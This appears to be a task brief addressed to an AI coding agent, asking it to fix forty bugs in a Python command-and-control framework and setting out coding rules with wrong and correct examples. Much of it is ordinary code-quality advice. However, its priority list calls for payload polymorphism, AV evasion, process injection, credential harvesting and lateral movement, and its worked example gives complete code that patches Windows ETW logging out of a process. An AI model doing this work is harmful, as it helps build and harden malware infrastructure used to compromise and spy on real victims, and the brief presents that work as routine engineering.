# CRITICAL: Fix All Bugs in FlipperFlipper C2 Framework

You are an elite software engineer tasked with fixing ALL bugs in a Python-based C2 (Command & Control) framework. This is production code that MUST be bulletproof.

## MISSION
Fix 40 critical bugs systematically. Work through `COMPLETE_TODO_LIST.md` in priority order. No shortcuts. No compromises. Every bug must be fixed properly with tests.

## REPOSITORY
- **GitHub:** https://github.com/oranolio956/flipperflipper.git
- **Branch:** main
- **Language:** Python 3.8+
- **Framework:** Flask + SQLite + Socket-based C2

## CRITICAL BUGS TO FIX
1. **796 bare exception handlers** - Silent failures everywhere
2. **Hardcoded credentials** - Security nightmare in `config.yaml`
3. **Zero error logging** - Impossible to debug
4. **Untested multi-agent isolation** - May not work at all
5. **No input validation** - Command injection vulnerabilities

Read `COMPLETE_TODO_LIST.md` for all 40 items.

---

## NON-NEGOTIABLE CODING RULES

These rules are MANDATORY. Breaking them = rejected code. No exceptions.

---

### RULE 1: Exception Handling (CRITICAL)
**NEVER EVER use bare `except:` clauses. This is the #1 bug in the codebase (796 instances).**

❌ **WRONG:**
```python
try:
    something()
except:
    pass
```

✅ **CORRECT:**
```python
try:
    something()
except (OSError, PermissionError) as e:
    log.error(f"Operation failed: {e}", exc_info=True)
    return None
```

**Requirements:**
- Always specify exception types
- Always log the exception with context
- Never use empty `pass` statements
- Include `exc_info=True` for stack traces
- Return meaningful error values

---

### RULE 2: Logging (CRITICAL)
**EVERY important operation MUST be logged. No logging = impossible debugging.**

❌ **WRONG:**
```python
def execute_command(command):
    result = subprocess.run(command, shell=True)
    return result.stdout
```

✅ **CORRECT:**
```python
def execute_command(self, agent_id, command_id, command):
    log.info(f"Agent {agent_id}: Executing command {command_id}: {command[:50]}")
    try:
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            timeout=30,
            text=True
        )
        log.info(f"Command {command_id} completed: exit_code={result.returncode}")
        return result.stdout
    except subprocess.TimeoutExpired:
        log.error(f"Command {command_id} timed out after 30s")
        raise
    except Exception as e:
        log.error(f"Command {command_id} failed: {e}", exc_info=True)
        raise
```

**Requirements:**
- Log function entry with parameters (sanitize sensitive data)
- Log success with results
- Log failures with full context
- Use appropriate log levels: DEBUG, INFO, WARNING, ERROR, CRITICAL
- Include identifiers (agent_id, command_id, user_id, etc.)

---

### RULE 3: No Hardcoded Secrets (CRITICAL - SECURITY)
**NEVER EVER hardcode credentials. This is a CRITICAL security vulnerability.**

❌ **WRONG:**
```python
SECRET_KEY = "my-secret-key-123"
password = "admin123"
auth_token = "CHANGE_THIS_SECRET_TOKEN"
```

✅ **CORRECT:**
```python
import os
import secrets

SECRET_KEY = os.getenv('SECRET_KEY') or secrets.token_urlsafe(32)
# Password should be set during setup, never hardcoded
auth_token = os.getenv('C2_AUTH_TOKEN')
if not auth_token:
    raise ValueError("C2_AUTH_TOKEN environment variable not set")
```

**Requirements:**
- Use environment variables for all secrets
- Generate secure random values with `secrets` module
- Validate that required secrets are set
- Never commit secrets to git
- Document required environment variables

---

### RULE 4: Input Validation (CRITICAL - SECURITY)
**EVERY user input MUST be validated. Missing validation = command injection vulnerability.**

❌ **WRONG:**
```python
@app.route('/api/execute', methods=['POST'])
def execute():
    command = request.json['command']
    os.system(command)  # Command injection vulnerability!
```

✅ **CORRECT:**
```python
@app.route('/api/execute', methods=['POST'])
def execute():
    data = request.get_json()
    
    # Validate input exists
    if not data or 'command' not in data:
        return jsonify({'error': 'Missing command'}), 400
    
    command = data['command']
    
    # Validate command type
    if not isinstance(command, str):
        return jsonify({'error': 'Command must be string'}), 400
    
    # Validate command length
    if len(command) > 10000:
        return jsonify({'error': 'Command too long'}), 400
    
    # Validate agent_id
    agent_id = data.get('agent_id')
    if not agent_id or not re.match(r'^[a-zA-Z0-9_-]+$', agent_id):
        return jsonify({'error': 'Invalid agent_id'}), 400
    
    # Sanitize and execute
    try:
        result = execute_command_safely(agent_id, command)
        return jsonify({'result': result}), 200
    except Exception as e:
        log.error(f"Execution failed: {e}", exc_info=True)
        return jsonify({'error': 'Execution failed'}), 500
```

**Requirements:**
- Validate all input exists
- Validate data types
- Validate lengths and ranges
- Sanitize strings (escape special characters)
- Use parameterized queries for SQL
- Validate file paths (prevent path traversal)
- Return meaningful error messages

---

### RULE 5: Type Hints (MANDATORY)
**ALL functions MUST have type hints. No exceptions.**

❌ **WRONG:**
```python
def get_agent(agent_id):
    return db.query(agent_id)
```

✅ **CORRECT:**
```python
from typing import Optional, Dict, Any

def get_agent(agent_id: str) -> Optional[Dict[str, Any]]:
    """
    Retrieve agent information from database.
    
    Args:
        agent_id: Unique identifier for the agent
        
    Returns:
        Dictionary containing agent data, or None if not found
    """
    try:
        return db.query(agent_id)
    except Exception as e:
        log.error(f"Failed to get agent {agent_id}: {e}")
        return None
```

**Requirements:**
- Add type hints to all parameters
- Add return type hints
- Use `Optional[T]` for nullable returns
- Use `Dict`, `List`, `Tuple` from typing module
- Add docstrings with Args and Returns sections

---

### RULE 6: Function Size (MANDATORY)
**Maximum 50 lines per function. Period. Extract complex logic into helpers.**

❌ **WRONG:**
```python
def handle_agent(client_socket, address):
    # 500 lines of code doing everything
    ...
```

✅ **CORRECT:**
```python
def handle_agent(client_socket: socket.socket, address: tuple) -> None:
    """Main agent handler - delegates to specific handlers."""
    try:
        agent_id = authenticate_agent(client_socket)
        if not agent_id:
            return
        
        register_agent(agent_id, client_socket, address)
        communication_loop(agent_id, client_socket)
    finally:
        cleanup_agent(agent_id, client_socket)

def authenticate_agent(client_socket: socket.socket) -> Optional[str]:
    """Authenticate agent and return agent_id."""
    # 20 lines max
    ...

def register_agent(agent_id: str, socket: socket.socket, address: tuple) -> None:
    """Register agent in database and memory."""
    # 20 lines max
    ...
```

**Requirements:**
- Maximum 50 lines per function
- One responsibility per function
- Extract complex logic into helper functions
- Use descriptive function names
- Add docstrings to all functions

---

### RULE 7: Error Messages (MANDATORY)
**Error messages MUST be clear and actionable. No generic "Error" messages.**

❌ **WRONG:**
```python
raise Exception("Error")
return {'error': 'Failed'}
```

✅ **CORRECT:**
```python
raise ValueError(f"Invalid agent_id format: {agent_id}. Must match [a-zA-Z0-9_-]+")

return {
    'error': 'Command execution failed',
    'details': 'Agent is not connected',
    'agent_id': agent_id,
    'suggestion': 'Check agent status in dashboard'
}, 400
```

**Requirements:**
- Describe what went wrong
- Include relevant context (IDs, values)
- Suggest how to fix it
- Use appropriate exception types
- Include error codes for APIs

---

### RULE 8: Database Queries (CRITICAL - SECURITY)
**ALWAYS use parameterized queries. String formatting = SQL injection vulnerability.**

❌ **WRONG:**
```python
cursor.execute(f"SELECT * FROM agents WHERE id = '{agent_id}'")  # SQL injection!
```

✅ **CORRECT:**
```python
cursor.execute('SELECT * FROM agents WHERE id = ?', (agent_id,))
```

**Requirements:**
- Never use string formatting for SQL
- Always use parameterized queries (?, ?)
- Validate input before querying
- Use transactions for multiple operations
- Handle database exceptions specifically

---

### RULE 9: File Operations (CRITICAL - SECURITY)
**ALWAYS validate file paths. Missing validation = path traversal vulnerability.**

❌ **WRONG:**
```python
content = open(filename).read()
```

✅ **CORRECT:**
```python
from pathlib import Path

def read_file_safely(filepath: str, base_dir: str) -> Optional[str]:
    """
    Read file with path traversal protection.
    
    Args:
        filepath: Requested file path
        base_dir: Base directory to restrict access
        
    Returns:
        File content or None if error
    """
    try:
        # Prevent path traversal
        base = Path(base_dir).resolve()
        target = (base / filepath).resolve()
        
        if not target.is_relative_to(base):
            log.warning(f"Path traversal attempt: {filepath}")
            return None
        
        if not target.exists():
            log.error(f"File not found: {target}")
            return None
        
        with open(target, 'r', encoding='utf-8') as f:
            return f.read()
            
    except PermissionError:
        log.error(f"Permission denied: {target}")
        return None
    except Exception as e:
        log.error(f"Failed to read {target}: {e}", exc_info=True)
        return None
```

**Requirements:**
- Validate paths to prevent traversal
- Use context managers (`with` statement)
- Handle encoding explicitly
- Check file existence before operations
- Handle permission errors

---

### RULE 10: Testing (MANDATORY)
**EVERY bug fix MUST have a test. No test = no merge.**

✅ **REQUIRED:**
```python
# tests/test_agent_isolation.py
import pytest
from Core.database import EliteDatabase

def test_multi_agent_command_isolation():
    """Test that commands are isolated per agent."""
    db = EliteDatabase()
    
    # Setup: Create 4 agents
    agents = ['agent1', 'agent2', 'agent3', 'agent4']
    for agent_id in agents:
        db.add_agent({'id': agent_id, 'hostname': f'host-{agent_id}'})
    
    # Add unique command to each agent
    for i, agent_id in enumerate(agents):
        db.add_command(agent_id, f'command-{i}')
    
    # Verify: Each agent gets only their command
    for i, agent_id in enumerate(agents):
        commands = db.get_pending_commands(agent_id)
        assert len(commands) == 1
        assert commands[0]['command'] == f'command-{i}'
    
    # Cleanup
    for agent_id in agents:
        db.delete_agent(agent_id)
```

**Requirements:**
- Write tests for all bug fixes
- Test both success and failure cases
- Use pytest framework
- Mock external dependencies
- Aim for 80%+ code coverage

---

### RULE 11: Git Commits (MANDATORY)
**Commit messages MUST follow conventional commit format. No "fix stuff" commits.**

❌ **WRONG:**
```bash
git commit -m "fix stuff"
git commit -m "update"
```

✅ **CORRECT:**
```bash
git commit -m "fix: Replace bare exceptions in Core/memory_protection.py

- Replace 15 bare except clauses with specific exception types
- Add error logging with context to all exception handlers
- Add unit tests for error handling paths
- Document exception types in function docstrings

Resolves: CRITICAL issue #2 from COMPLETE_TODO_LIST.md
Impact: Prevents silent failures, enables debugging

Co-authored-by: AI Assistant <ai@example.com>"
```

**Requirements:**
- Use conventional commit format: `fix:`, `feat:`, `refactor:`, `test:`
- First line: Brief summary (50 chars max)
- Blank line
- Detailed description with bullet points
- Reference issue numbers
- Explain impact/reasoning
- Add co-author tag

---

### RULE 12: Pre-Commit Checklist (MANDATORY)
**Before EVERY commit, verify ALL items below. Missing one = rejected code.**

- [ ] No bare `except:` clauses
- [ ] All exceptions logged with context
- [ ] No hardcoded secrets or credentials
- [ ] All user input validated
- [ ] Type hints on all functions
- [ ] Docstrings on all functions
- [ ] Functions under 50 lines
- [ ] Clear error messages
- [ ] Parameterized SQL queries
- [ ] File paths validated
- [ ] Tests written and passing
- [ ] Commit message follows format
- [ ] No debug print statements
- [ ] No commented-out code
- [ ] Imports organized and minimal

---

## Workflow

### 1. Setup
```bash
git clone https://github.com/oranolio956/flipperflipper.git
cd flipperflipper
pip install -r requirements.txt
```

### 2. Create Branch
```bash
git checkout -b feature/fix-critical-bugs
```

### 3. Fix Bugs (Priority Order)
1. Read `COMPLETE_TODO_LIST.md`
2. Start with CRITICAL items
3. Fix one category at a time
4. Follow ALL coding rules above
5. Write tests for each fix
6. Commit after each logical group of fixes

### 4. Test
```bash
# Run tests
pytest tests/ -v

# Check code quality
flake8 Core/ --max-line-length=100
mypy Core/ --ignore-missing-imports
```

### 5. Commit
```bash
git add <files>
git commit -m "fix: <description>

- Change 1
- Change 2

Resolves: Issue #X from COMPLETE_TODO_LIST.md

Co-authored-by: AI Assistant <ai@example.com>"
```

### 6. Push
```bash
git push -u origin feature/fix-critical-bugs
```

---

## Priority List (From COMPLETE_TODO_LIST.md)

### CRITICAL 🔴 (Do First)
1. **Hardcoded credentials** - `config.yaml`, `initialize_databases.py`
2. **796 bare exceptions** - All Core modules
3. **Missing logging** - C2 server, command execution
4. **Multi-agent testing** - Create test suite
5. **Input validation** - All API endpoints

### HIGH 🟠 (Do Second)
6. Payload polymorphism
7. Cross-platform evasion
8. Integration tests
9. Error handling audit
10. Rate limiting

### MEDIUM 🟡 (Do Third)
11. Advanced C2 features
12. Process injection
13. Credential harvesting
14. Lateral movement
15. Database indexing

---

## Success Criteria

### Phase 1: Critical (1 week)
- [ ] All hardcoded credentials removed
- [ ] All 796 bare exceptions fixed
- [ ] Logging added to all critical paths
- [ ] Multi-agent isolation tested
- [ ] Input validation on all endpoints

### Phase 2: Quality (2 weeks)
- [ ] 50+ integration tests
- [ ] True polymorphic payloads
- [ ] Cross-platform evasion
- [ ] Code quality 9/10

### Phase 3: Production (1 month)
- [ ] All 40 TODO items complete
- [ ] Load tested with 10+ agents
- [ ] AV evasion tested
- [ ] Documentation updated

---

## Example: Fixing Bare Exceptions

### Before (BAD):
```python
def patch_etw(self) -> bool:
    try:
        etw_event_write = self.kernel32.GetProcAddress(...)
        if not etw_event_write:
            return False
        self.kernel32.VirtualProtect(...)
        ctypes.c_ubyte.from_address(etw_event_write).value = 0xC3
        return True
    except:  # BAD: Bare exception
        return False  # BAD: Silent failure
```

### After (GOOD):
```python
def patch_etw(self) -> bool:
    """
    Patch Event Tracing for Windows to prevent logging.
    
    Returns:
        True if patching succeeded, False otherwise
    """
    try:
        etw_event_write = self.kernel32.GetProcAddress(
            self.kernel32.GetModuleHandleW("ntdll.dll"),
            b"EtwEventWrite"
        )
        
        if not etw_event_write:
            log.warning("ETW: Could not find EtwEventWrite address")
            return False
        
        old_protect = wintypes.DWORD()
        if not self.kernel32.VirtualProtect(
            etw_event_write, 1, 0x40, ctypes.byref(old_protect)
        ):
            log.error("ETW: VirtualProtect failed")
            return False
        
        # Patch with RET instruction
        ctypes.c_ubyte.from_address(etw_event_write).value = 0xC3
        
        # Restore protection
        self.kernel32.VirtualProtect(
            etw_event_write, 1, old_protect.value, ctypes.byref(old_protect)
        )
        
        log.info("ETW: Successfully patched EtwEventWrite")
        return True
        
    except OSError as e:
        log.error(f"ETW: OS error during patching: {e}", exc_info=True)
        return False
    except AttributeError as e:
        log.error(f"ETW: Missing kernel32 attribute: {e}", exc_info=True)
        return False
    except Exception as e:
        log.error(f"ETW: Unexpected error during patching: {e}", exc_info=True)
        return False
```

---

---

## FINAL INSTRUCTIONS - READ CAREFULLY

### Your Approach MUST Be:
1. **Systematic** - Work through COMPLETE_TODO_LIST.md in exact priority order
2. **Thorough** - Fix bugs properly, not quickly
3. **Tested** - Every fix needs a test
4. **Documented** - Clear commit messages explaining what and why
5. **Compliant** - Follow ALL 12 rules above without exception

### Work Order:
1. **Week 1:** Fix CRITICAL bugs (hardcoded credentials, bare exceptions, logging)
2. **Week 2:** Fix HIGH priority bugs (input validation, error handling)
3. **Week 3:** Fix MEDIUM priority bugs (features, optimizations)
4. **Week 4:** Final testing, documentation, deployment prep

### Quality Standards:
- **Code Quality:** 9/10 minimum
- **Test Coverage:** 80%+ minimum
- **Security:** Zero vulnerabilities
- **Performance:** No regressions
- **Documentation:** Complete and accurate

### Rejection Criteria (Your code will be rejected if):
- ❌ Any bare `except:` clauses remain
- ❌ Any hardcoded credentials remain
- ❌ Missing error logging
- ❌ Missing input validation
- ❌ No tests for fixes
- ❌ Poor commit messages
- ❌ Functions over 50 lines
- ❌ Missing type hints
- ❌ SQL injection vulnerabilities
- ❌ Path traversal vulnerabilities

### Success Criteria (Your code is accepted when):
- ✅ All 40 items from COMPLETE_TODO_LIST.md are fixed
- ✅ All 12 coding rules followed
- ✅ 80%+ test coverage
- ✅ Zero security vulnerabilities
- ✅ All tests passing
- ✅ Code quality 9/10+
- ✅ Documentation updated
- ✅ Clean git history

---

## START HERE

```bash
# 1. Clone repository
git clone https://github.com/oranolio956/flipperflipper.git
cd flipperflipper

# 2. Read the TODO list
cat COMPLETE_TODO_LIST.md

# 3. Create feature branch
git checkout -b feature/fix-all-bugs

# 4. Start with CRITICAL item #1
# Fix hardcoded credentials in config.yaml

# 5. Follow the 12 rules
# 6. Write tests
# 7. Commit properly
# 8. Move to next item

# Repeat until all 40 items are fixed
```

---

## YOU ARE RESPONSIBLE FOR:
- ✅ Fixing ALL 40 bugs
- ✅ Following ALL 12 rules
- ✅ Writing ALL tests
- ✅ Making this code production-ready
- ✅ Zero compromises on quality

## YOU ARE NOT ALLOWED TO:
- ❌ Skip any bugs
- ❌ Break any rules
- ❌ Skip writing tests
- ❌ Use shortcuts
- ❌ Leave TODOs in code
- ❌ Commit broken code

---

**This is production code for a C2 framework. Lives may depend on it working correctly. No pressure, but also... all the pressure. Make it bulletproof.**

**Now go fix those bugs. All of them. Properly. 🎯**
